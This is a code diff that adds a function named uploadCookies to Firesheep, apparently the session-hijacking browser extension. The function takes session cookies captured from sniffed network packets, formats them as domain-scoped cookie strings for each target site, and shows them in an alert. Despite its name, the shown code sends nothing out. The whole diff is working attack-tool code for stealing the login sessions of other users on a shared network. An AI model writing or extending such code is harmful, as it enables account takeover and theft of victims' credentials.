@@ -161,6 +161,24 @@ function addResult (result) {
   
   list.appendChild(item);
 }
+
+function uploadCookies() {
+  for (var resultIndex in Firesheep.results) {
+    var result = Firesheep.results[resultIndex];
+
+    var ios = Cc["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService);
+    var cookieUri = ios.newURI(result.siteUrl, null, null);
+
+    var cookieSvc = Cc["@mozilla.org/cookieService;1"].getService(Ci.nsICookieService);
+    var cookieResult = "";
+    for (var cookieName in result.firstPacket.cookies) {
+      var cookieValue = result.firstPacket.cookies[cookieName];
+      var cookieString = cookieName + '=' + cookieValue + ';domain=.' + cookieUri.host;
+      cookieResult += cookieString + "\n";
+    }
+    alert(cookieResult);
+  }
+}
  
 function onResultDoubleClick () {
   try {
